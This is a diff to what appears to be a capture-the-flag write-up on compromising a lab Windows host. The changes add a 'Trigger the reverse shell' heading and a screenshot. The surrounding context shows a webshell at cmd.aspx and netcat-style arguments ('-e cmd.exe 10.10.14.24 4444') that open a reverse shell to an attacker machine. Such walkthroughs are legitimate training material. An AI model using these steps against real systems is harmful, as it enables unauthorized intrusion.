@@ -54,6 +54,8 @@ Navigate to "http://10.10.10.5/cmd.aspx", and get a webshell.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a37e66b5-b01c-4d6a-b2bb-bd8c4c0b464b)
 
+Trigger the reverse shell:
+
 ```
 # On the kali attack vm:
 ls /usr/share/windows-binaries
@@ -69,6 +71,8 @@ Arguments: -e cmd.exe 10.10.14.24 4444
 
 Run
 ```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/34e2978a-e667-4b52-be83-934e27050b5a)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78cf0d24-8148-458c-9b1d-bb9f20707968)
 
